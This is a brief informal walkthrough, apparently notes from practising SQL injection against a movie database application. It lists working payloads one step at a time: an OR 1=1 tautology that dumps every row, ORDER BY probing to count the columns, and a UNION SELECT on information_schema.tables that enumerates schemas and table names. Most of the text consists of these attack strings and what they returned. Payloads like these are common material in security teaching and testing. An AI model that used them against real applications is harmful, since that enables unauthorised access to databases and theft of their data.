first i wanted to know if it accepts an sql injection 
i wrote ' or 1=1 # but it gives me error 
i changed it to ' or 1=1 -- it works and display all movies in the database
i want to know how many columns in the table by using order by let's say 7 coloumns 
' order by 7 -- it gives error lets try 6 columns 
' order by 6 --
it works and display the columns 
and to select the tables : ' union all select 1,2,3,4,5,6 -- 
it print another row contain columns 2, 3,5 ,4 
so i will print in this columns what i want like
' union all select 1,table_schema,table_name,4,5,6 from information_schema.tables where 1=0 or 1=1 --
and another payloads you know .
